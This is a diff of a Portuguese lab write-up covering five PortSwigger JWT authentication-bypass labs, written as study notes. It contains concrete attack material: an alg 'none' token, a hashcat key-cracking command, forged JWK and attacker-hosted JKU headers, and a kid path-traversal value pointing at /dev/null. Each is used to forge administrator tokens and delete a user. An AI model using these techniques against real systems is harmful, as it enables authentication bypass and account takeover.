@@ -1,50 +1,41 @@
-# Lab: JWT Authentication Bypass via Flawed Signature Verification
+# JWT Attacks – Authentication Bypass Labs
 
-## Informações do Laboratório
+## 📌 Informações Gerais
 
 * Plataforma: PortSwigger Web Security Academy
 * Categoria: JWT Attacks
-* Nível: Apprentice
-* Status: Solved
+* Nível: Apprentice → Practitioner
+* Ferramentas utilizadas:
+
+  * Burp Suite Community
+  * Firefox
+  * Hashcat
+  * JWT Editor
+  * Linux CLI
+  * OpenSSL
+  * Python (PyJWT)
 
 ---
 
-## 🎯 Objetivo
+# 1. JWT Authentication Bypass via Unverified Signature
 
-Explorar uma falha de implementação no mecanismo de autenticação baseado em JWT para obter acesso ao painel administrativo da aplicação e excluir o usuário `carlos`.
+## Vulnerabilidade
 
-O laboratório demonstra como uma validação incorreta da assinatura de tokens JWT pode permitir que um atacante modifique informações críticas de autenticação e escale privilégios.
-
----
-
-## 📖 Entendendo a Vulnerabilidade
-
-JWT (JSON Web Token) é amplamente utilizado para autenticação e gerenciamento de sessões.
-
-Um JWT é composto por três partes:
-
-```text
-HEADER.PAYLOAD.SIGNATURE
-```
-
-### Header
-
-Define o algoritmo utilizado para assinatura.
-
-Exemplo:
+A aplicação aceitava tokens com algoritmo:
 
 ```json
 {
-  "alg": "RS256",
-  "typ": "JWT"
+  "alg": "none"
 }
 ```
 
-### Payload
+Sem exigir assinatura válida.
 
-Contém as claims (informações) do usuário.
+---
 
-Exemplo:
+## Exploração
+
+JWT original:
 
 ```json
 {
@@ -52,96 +43,92 @@ Exemplo:
 }
 ```
 
-### Signature
-
-Garante a integridade do token.
-
-Quando a assinatura não é validada corretamente pelo servidor, um atacante pode modificar o payload livremente e assumir a identidade de qualquer usuário.
-
----
-
-## 🔧 Ferramentas Utilizadas
-
-* Burp Suite Community Edition
-* Navegador (Firefox / Chrome)
-* JWT Editor do Burp Suite
-* jwt.io (opcional)
-
----
-
-## 🔍 Reconhecimento
-
-Após efetuar login com as credenciais fornecidas:
-
-```text
-wiener:peter
-```
-
-foi possível identificar um JWT armazenado no cookie de sessão.
-
-No Burp Suite:
-
-```text
-Proxy → HTTP History
-```
-
-Localizei a requisição:
-
-```http
-GET /my-account
-```
-
-Observando o cookie:
-
-```http
-Cookie: session=<JWT>
-```
-
-Ao decodificar o token, foi possível visualizar a seguinte claim:
+Payload modificado:
 
 ```json
 {
-  "sub": "wiener"
+  "sub": "administrator"
 }
 ```
 
-A claim `sub` representa o usuário autenticado.
+Header alterado:
+
+```json
+{
+  "alg": "none"
+}
+```
+
+A assinatura foi removida completamente.
 
 ---
 
-## 🚀 Exploração
+## Resultado
 
-### 1. Enviar a Requisição para o Repeater
+A aplicação aceitou o token não assinado e concedeu acesso administrativo.
 
-Clique com o botão direito na requisição:
+Endpoint explorado:
+
+```http
+/admin
+```
+
+Posteriormente:
+
+```http
+/admin/delete?username=carlos
+```
+
+---
+
+## Conceitos Aprendidos
+
+* JWT sem assinatura
+* Algoritmo none
+* Bypass de autenticação
+* Escalação de privilégios
+
+---
+
+# 2. JWT Authentication Bypass via Weak Signing Key
+
+## Vulnerabilidade
+
+O servidor utilizava uma chave secreta extremamente fraca para assinar tokens HS256.
+
+---
+
+## Reconhecimento
+
+JWT identificado:
+
+```json
+{
+  "alg": "HS256"
+}
+```
+
+Foi realizado brute-force utilizando Hashcat.
+
+---
+
+## Ataque
+
+Comando utilizado:
+
+```bash
+hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
+```
+
+Resultado:
 
 ```text
-Send to Repeater
+secret1
 ```
 
 ---
 
-### 2. Testar Acesso ao Painel Administrativo
-
-Alterei o endpoint:
-
-```http
-GET /my-account
-```
-
-para:
-
-```http
-GET /admin
-```
-
-A aplicação retornou acesso negado, confirmando que o usuário atual não possui privilégios administrativos.
-
----
-
-### 3. Modificar o JWT
-
-No painel Inspector do Burp:
+## Exploração
 
 Payload original:
 
@@ -159,99 +146,290 @@ Payload modificado:
 }
 ```
 
-Após a alteração:
+Token assinado novamente utilizando:
 
 ```text
-Apply Changes
+secret1
 ```
 
 ---
 
-### 4. Falha de Verificação da Assinatura
+## Resultado
 
-O servidor não validava corretamente a assinatura do JWT.
+Acesso administrativo obtido.
 
-Como consequência, a aplicação aceitou o token adulterado mesmo após a modificação do payload.
-
-Isso permitiu assumir a identidade do usuário administrador sem possuir qualquer credencial válida.
-
----
-
-### 5. Acesso Administrativo
-
-Reenviei a requisição:
-
-```http
-GET /admin
-```
-
-Desta vez o servidor concedeu acesso ao painel administrativo.
-
----
-
-### 6. Exclusão do Usuário Carlos
-
-Dentro do painel administrativo foi identificado o endpoint:
+Endpoint utilizado:
 
 ```http
 /admin/delete?username=carlos
 ```
 
-Ao acessar essa URL utilizando o JWT adulterado, o usuário `carlos` foi removido com sucesso.
+---
 
-O laboratório foi concluído imediatamente após a exclusão.
+## Conceitos Aprendidos
+
+* JWT HS256
+* Brute Force de Signing Keys
+* Hashcat
+* Reassinar Tokens JWT
 
 ---
 
-## ⚠️ Impacto da Vulnerabilidade
+# 3. JWT Authentication Bypass via JWK Header Injection
 
-Uma falha desse tipo pode permitir:
+## Vulnerabilidade
+
+A aplicação aceitava a chave pública enviada pelo próprio usuário através do parâmetro:
+
+```json
+{
+  "jwk": {...}
+}
+```
+
+Sem validar a origem da chave.
+
+---
+
+## Exploração
+
+Foi gerado um novo par RSA:
+
+```bash
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+```
+
+---
+
+## Conversão para JWK
+
+A chave pública foi convertida para formato JWK:
+
+```json
+{
+  "kty":"RSA",
+  "e":"AQAB",
+  "n":"..."
+}
+```
+
+---
+
+## Payload Modificado
+
+```json
+{
+  "sub":"administrator"
+}
+```
+
+---
+
+## Assinatura
+
+O token foi assinado com a chave privada gerada pelo atacante.
+
+O header passou a conter:
+
+```json
+{
+  "alg":"RS256",
+  "jwk":{...}
+}
+```
+
+---
+
+## Resultado
+
+O servidor utilizou a chave pública fornecida pelo atacante para validar o JWT.
+
+Acesso administrativo obtido.
+
+---
+
+## Conceitos Aprendidos
+
+* JWK
+* RSA
+* RS256
+* Assinatura Assimétrica
+* Confiança em Chaves Não Confiáveis
+
+---
+
+# 4. JWT Authentication Bypass via JKU Header Injection
+
+## Vulnerabilidade
+
+O servidor aceitava o parâmetro:
+
+```json
+{
+  "jku":"https://attacker-server/jwks.json"
+}
+```
+
+Sem validar a origem da URL.
+
+---
+
+## Exploração
+
+Foi criado um JWKS controlado pelo atacante:
+
+```json
+{
+  "keys":[
+    {
+      "kty":"RSA",
+      "e":"AQAB",
+      "n":"..."
+    }
+  ]
+}
+```
+
+Hospedado no Exploit Server.
+
+---
+
+## Payload
+
+```json
+{
+  "sub":"administrator"
+}
+```
+
+---
+
+## Resultado
+
+O servidor baixou a chave pública do servidor controlado pelo atacante e validou o JWT adulterado.
+
+Acesso administrativo obtido.
+
+---
+
+## Conceitos Aprendidos
+
+* JWKS
+* JKU Header
+* Key Distribution
+* Trusted Key Sources
+* Server Side Trust Abuse
+
+---
+
+# 5. JWT Authentication Bypass via KID Header Path Traversal
+
+## Vulnerabilidade
+
+A aplicação utilizava o valor de:
+
+```json
+{
+  "kid":"..."
+}
+```
+
+Para localizar arquivos de chave no sistema.
+
+Não havia sanitização adequada.
+
+---
+
+## Exploração
+
+Header modificado:
+
+```json
+{
+  "alg":"HS256",
+  "kid":"../../../../../../../dev/null"
+}
+```
+
+---
+
+## Assinatura
+
+O token foi assinado utilizando chave vazia:
+
+```text
+""
+```
+
+ou
+
+```json
+{
+  "k":""
+}
+```
+
+Dependendo da implementação.
+
+---
+
+## Resultado
+
+O servidor carregou:
+
+```text
+/dev/null
+```
+
+Como chave de verificação.
+
+Isso permitiu criar uma assinatura válida e assumir privilégios administrativos.
+
+---
+
+## Conceitos Aprendidos
+
+* Path Traversal
+* File-Based Key Resolution
+* KID Header Abuse
+* JWT Verification Bypass
+
+---
+
+# Impacto Geral das Vulnerabilidades JWT
+
+Uma implementação insegura de JWT pode resultar em:
 
 * Bypass completo da autenticação
 * Escalação de privilégios
-* Acesso administrativo não autorizado
+* Comprometimento de contas administrativas
+* Acesso a dados sensíveis
+* Execução de ações privilegiadas
 * Comprometimento total da aplicação
-* Manipulação de sessões de outros usuários
-
-Caso explorada em produção, a vulnerabilidade pode resultar na tomada completa do sistema.
 
 ---
 
-## 🛡️ Mitigações
+# Conceitos Dominados
 
-Para prevenir esse tipo de falha:
+Após concluir estes laboratórios foram praticados:
 
-* Validar rigorosamente a assinatura de todos os JWTs
-* Aceitar apenas algoritmos previamente definidos
-* Utilizar bibliotecas JWT atualizadas
-* Implementar controles adicionais de autorização
-* Evitar confiar exclusivamente em claims para decisões críticas de acesso
-* Monitorar alterações suspeitas em tokens de sessão
-
----
-
-## 📚 Conceitos Aprendidos
-
-Durante este laboratório foram praticados os seguintes conceitos:
-
-* Estrutura de um JWT
-* Header, Payload e Signature
-* Claims de autenticação
-* Claim `sub`
-* Manipulação de tokens JWT
-* Verificação de assinatura
-* Escalação de privilégios
-* Bypass de autenticação
-* Análise de sessões utilizando Burp Suite
-
----
-
-## 🏁 Conclusão
-
-Este laboratório demonstrou como uma implementação incorreta de JWT pode comprometer completamente o mecanismo de autenticação de uma aplicação.
-
-Mesmo utilizando um padrão moderno de autenticação, a ausência de validação adequada da assinatura permite que um atacante modifique informações sensíveis dentro do token e assuma privilégios administrativos.
-
-A principal lição aprendida é que a segurança de um JWT não está apenas em seu formato, mas na verificação correta de sua assinatura e integridade pelo servidor.
-
-✅ Lab resolvido com sucesso.
+* JWT Structure
+* Header
+* Payload
+* Signature
+* HS256
+* RS256
+* JWK
+* JWKS
+* JKU Header
+* KID Header
+* Algorithm Confusion
+* Weak Signing Keys
+* Brute Force com Hashcat
+* RSA Keys
+* OpenSSL
+* PyJWT
+* Authentication Bypass
+* Privilege Escalation
+* Burp Suite JWT Analysis
